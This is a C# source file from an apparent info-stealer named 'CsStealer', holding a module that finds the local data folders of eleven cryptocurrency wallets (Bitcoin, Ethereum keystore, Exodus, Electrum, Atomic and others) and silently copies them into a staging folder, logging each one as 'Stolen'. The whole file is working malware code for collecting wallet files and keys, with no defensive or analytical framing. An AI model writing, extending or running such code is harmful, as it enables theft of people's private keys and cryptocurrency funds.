using System;
using System.Diagnostics;

namespace CsStealer
{
    public class Wallets
    {
        public static string OutputDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "TmpDatas");
        public static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public static Dictionary<string, string> LocalWallets = new Dictionary<string, string>
    {
        { "Bitcoin", Path.Combine(AppData, "Bitcoin", "wallets") },
        { "Zcash", Path.Combine(AppData, "Zcash") },
        { "Armory", Path.Combine(AppData, "Armory") },
        { "Bytecoin", Path.Combine(AppData, "bytecoin") },
        { "Jaxx", Path.Combine(AppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb") },
        { "Exodus", Path.Combine(AppData, "Exodus", "exodus.wallet") },
        { "Ethereum", Path.Combine(AppData, "Ethereum", "keystore") },
        { "Electrum", Path.Combine(AppData, "Electrum", "wallets") },
        { "AtomicWallet", Path.Combine(AppData, "atomic", "Local Storage", "leveldb") },
        { "Guarda", Path.Combine(AppData, "Guarda", "Local Storage", "leveldb") },
        { "Coinomi", Path.Combine(AppData, "Coinomi", "Coinomi", "wallets") }
    };

        private static void CopyTree(string sourcePath, string targetPath, bool overwrite = false)
        {
            if (!Directory.Exists(sourcePath))
                return;

            Directory.CreateDirectory(targetPath);

            foreach (string filePath in Directory.GetFiles(sourcePath))
            {
                string destFile = Path.Combine(targetPath, Path.GetFileName(filePath));
                try
                {
                    File.Copy(filePath, destFile, overwrite);
                }
                catch
                {
                }
            }

            foreach (string directory in Directory.GetDirectories(sourcePath))
            {
                string destDir = Path.Combine(targetPath, Path.GetFileName(directory));
                CopyTree(directory, destDir, overwrite);
            }
        }

        private static void GetWallet(string DistPath, string WalletPath, string WalletName)
        {
            if (Directory.Exists(WalletPath))
            {
                try
                {
                    CopyTree(WalletPath, DistPath);
                    Debugger.Debug("INFO", $"Stolen {WalletName}");
                }
                catch (Exception ex)
                {
                    Debugger.Debug("ERROR", $"{WalletName} found in '{WalletPath}' but an error occured while stealing it : {ex.Message}");
                }
            }
        }

        public static void GetAllWallets()
        {
            foreach (KeyValuePair<string, string> Pair in LocalWallets)
            {
                string WName = Pair.Key;
                string WPath = Pair.Value;
                string DistPath = Path.Combine(OutputDir, "Wallets", WName);

                GetWallet(DistPath, WPath, WName);
            }
        }
    }
}